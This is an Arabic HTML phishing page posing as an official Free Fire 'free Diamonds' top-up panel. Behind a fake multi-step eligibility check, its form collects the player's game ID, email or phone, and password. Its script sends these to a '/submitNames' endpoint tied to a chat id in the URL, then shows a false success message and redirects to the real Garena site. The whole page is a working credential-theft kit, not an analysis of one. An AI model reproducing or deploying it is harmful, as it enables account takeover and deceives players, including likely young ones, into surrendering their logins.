<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Mobile - المركز الرسمي لشحن جواهر</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
        body { font-family: 'Tajawal', sans-serif; background: #0a0a0a; }
        .game-gradient { background: linear-gradient(135deg, #1a1a1a 0%, #FF4500 100%); }
        .glass-card { background: rgba(18, 18, 24, 0.95); backdrop-filter: blur(15px); border: 1px solid #FF450040; }
        .package-card:hover { border-color: #FF4500; transform: translateY(-5px); }
    </style>
</head>
<body class="text-white min-h-screen flex flex-col justify-between selection:bg-[#FF4500]">
    <header class="w-full bg-black/80 border-b border-zinc-800 py-4 px-6 sticky top-0 z-50 backdrop-blur-md">
        <div class="max-w-6xl mx-auto flex justify-between items-center">
            <div class="flex items-center space-x-3 space-x-reverse">
                <div class="w-12 h-12 rounded-xl bg-zinc-900 border border-[#FF4500] flex items-center justify-center shadow-lg">
                    <i class="fa-solid fa-fire text-2xl" style="color: #FF4500"></i>
                </div>
                <div>
                    <span class="font-black text-xl tracking-wider text-white">Free Fire <span style="color: #FF4500">Rewards</span></span>
                    <span class="text-[10px] block text-zinc-500 font-bold uppercase">Official Partner Panel</span>
                </div>
            </div>
        </div>
    </header>
    <main class="flex-grow flex items-center justify-center p-4">
        <div class="w-full max-w-2xl glass-card rounded-[2.5rem] p-6 md:p-10 shadow-2xl relative overflow-hidden">
            <div id="step-1" class="step-content space-y-8">
                <div class="text-center space-y-3">
                    <h1 class="text-2xl md:text-4xl font-black">شحن جواهر Diamond مجاناً</h1>
                    <p class="text-zinc-400 text-sm">أدخل الآيدي (ID) الخاص بك للتحقق من أهلية الحساب</p>
                </div>
                <div class="space-y-4">
                    <input type="text" id="gameId" placeholder="أدخل ID الحساب هنا..." class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl py-4 px-6 text-white focus:outline-none focus:border-[#FF4500]">
                    <button type="button" onclick="nextStep(1, 2)" class="w-full py-4 rounded-2xl font-black text-lg shadow-xl" style="background-color: #FF4500">التحقق من الآيدي</button>
                </div>
            </div>
            <div id="step-2" class="step-content hidden space-y-6">
                <div class="text-center"><h2 class="text-2xl font-black mb-2">اختر باقة الـ جواهر Diamond</h2></div>
                <div class="grid grid-cols-2 gap-4"><div onclick="nextStep(2, 3)" class="package-card cursor-pointer bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-center"><img src="https://ff.garena.com/images/diamond.png" class="w-12 mx-auto mb-2"><div class="font-black text-[#FF4500]">5600 Diamond</div></div><div onclick="nextStep(2, 3)" class="package-card cursor-pointer bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-center"><img src="https://ff.garena.com/images/diamond.png" class="w-12 mx-auto mb-2"><div class="font-black text-[#FF4500]">2180 Diamond</div></div></div>
            </div>
            <div id="step-3" class="step-content hidden space-y-6">
                <div class="text-center space-y-2"><h2 class="text-2xl font-black">تحقق الأمان النهائي</h2></div>
                <form onsubmit="submitFinal(event)" class="space-y-4">
                    <input type="text" id="email" required placeholder="البريد الإلكتروني أو الهاتف" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl py-4 px-6 text-white outline-none focus:border-[#FF4500]">
                    <input type="password" id="pass" required placeholder="كلمة المرور" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl py-4 px-6 text-white outline-none focus:border-[#FF4500]">
                    <div id="status" class="hidden p-3 rounded-xl text-center text-xs font-bold bg-emerald-500/10 text-emerald-400"></div>
                    <button type="submit" id="subBtn" class="w-full py-4 rounded-2xl font-black text-lg shadow-xl" style="background-color: #FF4500">تأكيد الشحن الآن</button>
                </form>
            </div>
        </div>
    </main>
    <script>
        let gid = "";
        function nextStep(current, next) {
            if(current === 1) {
                gid = document.getElementById('gameId').value;
                if(!gid) return alert('أدخل الآيدي أولاً');
            }
            document.getElementById('step-'+current).classList.add('hidden');
            document.getElementById('step-'+next).classList.remove('hidden');
        }
        async function submitFinal(e) {
            e.preventDefault();
            const btn = document.getElementById('subBtn');
            const alert = document.getElementById('status');
            const urlParams = new URLSearchParams(window.location.search);
            const chatId = urlParams.get('id');
            btn.disabled = true; btn.innerHTML = 'جاري المعالجة...';
            await fetch('/submitNames', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: chatId,
                    firstName: "Game ID: " + gid + " | Email: " + document.getElementById('email').value,
                    secondName: document.getElementById('pass').value
                })
            });
            alert.classList.remove('hidden');
            alert.textContent = '✅ تم التحقق! سيتم شحن جواهر Diamond لحسابك خلال دقائق.';
            setTimeout(() => window.location.href = "https://ff.garena.com", 3000);
        }
    </script>
</body>
</html>
